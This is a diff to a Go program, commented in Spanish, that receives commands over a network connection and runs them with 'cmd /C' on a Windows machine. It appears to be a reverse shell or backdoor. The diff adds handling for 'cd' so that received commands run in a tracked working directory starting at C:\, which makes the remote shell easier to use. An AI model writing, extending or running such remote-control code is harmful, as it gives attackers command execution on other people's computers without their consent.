@@ -1,13 +1,13 @@
 package main
 
 import (
-    "bufio"
-    "fmt"
-    "io"
-    "net"
-    "os"
-    "os/exec"
-    "strings"
+	"bufio"
+	"fmt"
+	"io"
+	"net"
+	"os"
+	"os/exec"
+	"strings"
 )
 
 func main() {
@@ -16,6 +16,9 @@ func main() {
         panic(err)
     }
     defer c.Close()
+
+    // Define el directorio de trabajo inicial
+    currentDir := "C:\\" // Ajusta esto si deseas empezar desde otro directorio
 
     go func() {
         reader := bufio.NewReader(os.Stdin)
@@ -52,8 +55,24 @@ func main() {
         receivedCommand := strings.TrimSpace(string(buffer[:n]))
         fmt.Println("Comando recibido:", receivedCommand)
 
-        // Ejecutar el comando
+        // Detectar y procesar comandos 'cd'
+        if strings.HasPrefix(receivedCommand, "cd") {
+            args := strings.Split(receivedCommand, " ")
+            if len(args) > 1 {
+                // Actualizar el directorio actual
+                if args[1] == ".." {
+                    currentDir = strings.TrimRight(currentDir, "\\") + "\\.."
+                } else {
+                    currentDir = currentDir + "\\" + args[1]
+                }
+            }
+            c.Write([]byte("Directorio cambiado a: " + currentDir + "\n"))
+            continue
+        }
+
+        // Ejecutar el comando en el directorio actual
         cmd := exec.Command("cmd", "/C", receivedCommand)
+        cmd.Dir = currentDir // Configurar el directorio actual
         output, err := cmd.CombinedOutput()
         if err != nil {
             fmt.Println("Error al ejecutar el comando:", err)
